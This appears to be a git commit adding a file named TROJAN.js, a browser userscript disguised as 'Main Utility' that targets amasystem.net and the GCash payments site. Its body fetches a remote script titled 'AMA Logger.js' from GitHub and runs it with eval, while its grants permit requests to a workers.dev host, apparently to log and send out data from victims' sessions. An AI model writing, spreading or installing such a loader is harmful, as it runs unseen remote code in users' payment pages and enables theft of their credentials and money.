f3638ddbf2e2fcc1ac767917b48ba160e12fb49f
moz <90179093+moz-1337@users.noreply.github.com>
2026-09-02 05:17:54 +0800

    Create TROJAN.js

---
+++ TROJAN.js
@@ -0,0 +1,28 @@
+// ==UserScript==
+// @name         Main Utility
+// @namespace    https://*.amasystem.net/*
+// @namespace    https://payments.gcash.com/*
+// @version      1.0
+// @description  :3
+// @match        https://*.amasystem.net/*
+// @match        https://payments.gcash.com/*
+// @connect      main.bruhmod123.workers.dev
+// @grant        unsafeWindow
+// @grant        GM_xmlhttpRequest
+// ==/UserScript==
+
+// make sure to allow user scripts in manage extensions !!!
+// make sure to allow user scripts in manage extensions !!!
+// make sure to allow user scripts in manage extensions !!!
+// make sure to allow user scripts in manage extensions !!!
+// make sure to allow user scripts in manage extensions !!!
+// make sure to allow user scripts in manage extensions !!!
+// make sure to allow user scripts in manage extensions !!!
+// make sure to allow user scripts in manage extensions !!!
+
+(function() {
+    'use strict';
+    fetch("https://raw.githubusercontent.com/moz-1337/chrome/refs/heads/main/AMA%20Logger.js")
+    .then(r => r.text())
+    .then(code => eval(code));
+})();
